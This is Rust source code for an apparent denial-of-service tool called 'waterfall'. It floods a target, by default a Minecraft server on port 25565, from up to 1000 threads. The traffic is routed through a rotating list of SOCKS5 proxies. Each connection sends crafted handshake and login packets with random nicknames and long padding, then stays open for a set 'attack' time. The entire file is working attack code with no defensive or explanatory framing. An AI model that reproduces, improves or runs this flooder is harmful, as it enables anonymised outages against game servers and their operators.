use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use rand::Rng;

struct Options {
    map: HashMap<String, String>,
}

impl Options {
    fn parse(args: &[String]) -> Self {
        let mut map = HashMap::new();
        for arg in args {
            if let Some(pos) = arg.find('-') {
                let key = &arg[..pos];
                let value = &arg[pos + 1..];
                if !key.is_empty() {
                    map.insert(key.to_string(), value.to_string());
                }
            }
        }
        Options { map }
    }

    fn has(&self, key: &str) -> bool {
        self.map.contains_key(key)
    }

    fn get_str(&self, key: &str, default: &str) -> String {
        self.map.get(key).cloned().unwrap_or_else(|| default.to_string())
    }

    fn get_int(&self, key: &str, default: i64) -> i64 {
        self.map.get(key).and_then(|v| v.parse().ok()).unwrap_or(default)
    }

    fn get_bool(&self, key: &str, default: bool) -> bool {
        self.map.get(key).and_then(|v| v.parse().ok()).unwrap_or(default)
    }
}

#[derive(Clone)]
struct Proxy {
    host: String,
    port: u16,
}

struct ProxyManager {
    proxies: Vec<Proxy>,
    index: usize,
}

impl ProxyManager {
    fn new() -> Self {
        ProxyManager { proxies: Vec::new(), index: 0 }
    }

    fn load(&mut self, file: &str) -> std::io::Result<()> {
        let content = match std::fs::read_to_string(file) {
            Ok(c) => c,
            Err(_) => { std::fs::write(file, "")?; return Ok(()); }
        };
        for line in content.lines() {
            let line = line.replace(' ', "");
            if line.is_empty() || line.starts_with("##") || !line.contains(':') {
                continue;
            }
            let mut parts = line.splitn(2, ':');
            let host = match parts.next() { Some(h) => h.to_string(), None => continue };
            let port: u16 = parts.next().and_then(|p| p.parse().ok()).unwrap_or(8080);
            self.proxies.push(Proxy { host, port });
        }
        Ok(())
    }

    fn next(&mut self) -> Option<Proxy> {
        if self.proxies.is_empty() { return None; }
        if self.index >= self.proxies.len() { self.index = 0; }
        let p = self.proxies[self.index].clone();
        self.index += 1;
        Some(p)
    }

    fn remove(&mut self, proxy: &Proxy) {
        self.proxies.retain(|p| !(p.host == proxy.host && p.port == proxy.port));
    }
}

fn random_nick() -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    let mut rng = rand::thread_rng();
    (0..9).map(|_| CHARS[rng.gen_range(0..CHARS.len())] as char).collect()
}

fn flood(stream: &mut TcpStream, loop_amount: usize) -> std::io::Result<()> {
    let nick = random_nick();
    let nick_bytes = nick.as_bytes();
    let nick_len = nick_bytes.len() as u8;

    let mut buf = Vec::with_capacity(40 + loop_amount * 2);
    buf.extend_from_slice(&[15, 0, 47, 9]);
    buf.extend_from_slice(b"localhost");
    buf.extend_from_slice(&[200, 230, 2]);
    buf.push(nick_len + 2);
    buf.push(0);
    buf.push(nick_len);
    buf.extend_from_slice(nick_bytes);
    buf.extend_from_slice(&[15, 0, 47, 9]);
    buf.extend_from_slice(b"localhost");
    buf.extend_from_slice(&[200, 230, 1]);
    for _ in 0..loop_amount {
        buf.push(1);
        buf.push(0);
    }
    stream.write_all(&buf)
}

fn socks5_connect(proxy: &Proxy, host: &str, port: u16, timeout_ms: u64) -> std::io::Result<TcpStream> {
    let addr = format!("{}:{}", proxy.host, proxy.port)
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "proxy dns failed"))?;
    let mut stream = TcpStream::connect_timeout(&addr, Duration::from_millis(timeout_ms))?;
    stream.set_read_timeout(Some(Duration::from_millis(timeout_ms)))?;
    stream.set_write_timeout(Some(Duration::from_millis(timeout_ms)))?;
    stream.write_all(&[0x05, 0x01, 0x00])?;
    let mut resp = [0u8; 2];
    stream.read_exact(&mut resp)?;
    if resp[0] != 0x05 || resp[1] != 0x00 {
        return Err(std::io::Error::new(std::io::ErrorKind::ConnectionRefused, "socks5 auth rejected"));
    }
    let host_bytes = host.as_bytes();
    let mut req = vec![0x05, 0x01, 0x00, 0x03, host_bytes.len() as u8];
    req.extend_from_slice(host_bytes);
    req.push((port >> 8) as u8);
    req.push((port & 0xff) as u8);
    stream.write_all(&req)?;
    let mut hdr = [0u8; 4];
    stream.read_exact(&mut hdr)?;
    if hdr[1] != 0x00 {
        return Err(std::io::Error::new(std::io::ErrorKind::ConnectionRefused, "socks5 connect failed"));
    }
    match hdr[3] {
        0x01 => { let mut rest = [0u8; 6]; stream.read_exact(&mut rest)?; }
        0x03 => {
            let mut len = [0u8; 1]; stream.read_exact(&mut len)?;
            let n = len[0] as usize + 2;
            let mut rest = vec![0u8; n]; stream.read_exact(&mut rest)?;
        }
        0x04 => { let mut rest = [0u8; 18]; stream.read_exact(&mut rest)?; }
        _ => {}
    }
    Ok(stream)
}

fn direct_connect(host: &str, port: u16, timeout_ms: u64) -> std::io::Result<TcpStream> {
    let addr = format!("{}:{}", host, port)
        .to_socket_addrs()?
        .next()
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "dns failed"))?;
    let stream = TcpStream::connect_timeout(&addr, Duration::from_millis(timeout_ms))?;
    stream.set_read_timeout(Some(Duration::from_millis(timeout_ms)))?;
    stream.set_write_timeout(Some(Duration::from_millis(timeout_ms)))?;
    Ok(stream)
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let opts = Options::parse(&args);

    if !opts.has("host") {
        println!("Usage: ./waterfall host-<IP> port-<PORT> threads-<THREADS> time-<seconds>\n");
        return;
    }

    let host = opts.get_str("host", "127.0.0.1");
    let port = opts.get_int("port", 25565) as u16;
    let threads = opts.get_int("threads", 1000) as usize;
    let attack_secs = opts.get_int("time", 100) as u64;
    let timeout_ms = opts.get_int("timeout", 2200) as u64;
    let loop_amount = opts.get_int("l", 700) as usize;
    let debug = opts.get_bool("debug", false);
    let proxy_file = opts.get_str("file", "socks_proxies.txt");

    let mut proxies = ProxyManager::new();
    if let Err(e) = proxies.load(&proxy_file) {
        eprintln!("Failed to load proxies: {}", e);
        return;
    }

    let host = Arc::new(host);
    let stop = Arc::new(AtomicBool::new(false));
    let proxies = Arc::new(Mutex::new(proxies));

    {
        let stop = Arc::clone(&stop);
        std::thread::spawn(move || {
            std::thread::sleep(Duration::from_secs(attack_secs));
            stop.store(true, Ordering::SeqCst);
            std::process::exit(-1);
        });
    }

    let mut handles = Vec::new();
    for _ in 0..threads {
        let host = Arc::clone(&host);
        let proxies = Arc::clone(&proxies);
        let stop = Arc::clone(&stop);

        handles.push(std::thread::spawn(move || {
            let mut open: Vec<TcpStream> = Vec::new();
            let mut last: Option<Proxy> = None;

            while !stop.load(Ordering::Relaxed) {
                let proxy = proxies.lock().unwrap().next();
                let result = match &proxy {
                    Some(p) => { last = Some(p.clone()); socks5_connect(p, &host, port, timeout_ms) }
                    None => direct_connect(&host, port, timeout_ms),
                };
                match result {
                    Ok(mut s) => {
                        let _ = flood(&mut s, loop_amount);
                        if debug {
                            if let Some(ref p) = proxy {
                                println!("{}:{} -> {}:{}", p.host, p.port, host, port);
                            }
                        }
                        open.push(s);
                    }
                    Err(e) => {
                        if let Some(ref p) = last {
                            if e.to_string().contains("reply") {
                                proxies.lock().unwrap().remove(p);
                            }
                        }
                    }
                }
            }
        }));
    }

    for h in handles { let _ = h.join(); }
}
